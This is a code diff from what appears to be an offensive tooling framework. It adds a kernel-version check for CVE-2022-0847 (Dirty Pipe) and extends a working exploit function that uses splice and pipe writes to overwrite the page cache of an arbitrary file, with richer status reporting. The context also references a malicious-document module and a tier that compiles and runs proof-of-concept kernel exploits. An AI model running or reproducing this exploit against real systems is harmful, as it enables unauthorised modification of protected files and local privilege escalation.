@@ -954,6 +954,16 @@ def v3_mshtml_maldoc(ip=None, params=None):
 
 # ---- kernel tier (V3_CHECK: compile+run vendored PoC when possible) -------
 
+def _dirtypipe_kernel_vulnerable():
+    """True when the running kernel is inside the CVE-2022-0847 range
+    (5.8 .. 5.16.10, minus the backported fixes)."""
+    maj, minr, patch = _kernel_release()
+    return (5, 8) <= (maj, minr) <= (5, 16) and not (
+        (maj, minr, patch) >= (5, 16, 11)
+        or (maj, minr) == (5, 15) and (maj, minr, patch) >= (5, 15, 25)
+        or (maj, minr) == (5, 10) and (maj, minr, patch) >= (5, 10, 102))
+
+
 def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
     """CVE-2022-0847 Dirty Pipe — inline splice attack (Linux only)."""
     if not sys.platform.startswith("linux"):
@@ -974,15 +984,19 @@ def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
         off = ctypes.c_int64(offset - 1)
         n = libc.splice(fd, ctypes.byref(off), w, None, 1, SPLICE_F_MOVE)
         if n != 1:
+            err = ctypes.get_errno()
             os.close(fd); os.close(r); os.close(w)
-            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n}
+            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n,
+                    "errno": err}
         os.write(w, data)  # overwrites page-cache from `offset`
         os.close(fd); os.close(r); os.close(w)
         with open(path, "rb") as fh:
             fh.seek(offset)
             check = fh.read(len(data))
         return {"cve": "CVE-2022-0847", "status": "fired",
-                "verified": check == data, "path": path, "offset": offset}
+                "verified": check == data, "path": path, "offset": offset,
+                "kernel": "%d.%d.%d" % _kernel_release(),
+                "kernel_fixed": not _dirtypipe_kernel_vulnerable()}
     except Exception as exc:
         return {"cve": "CVE-2022-0847", "status": "error", "error": str(exc)}
 
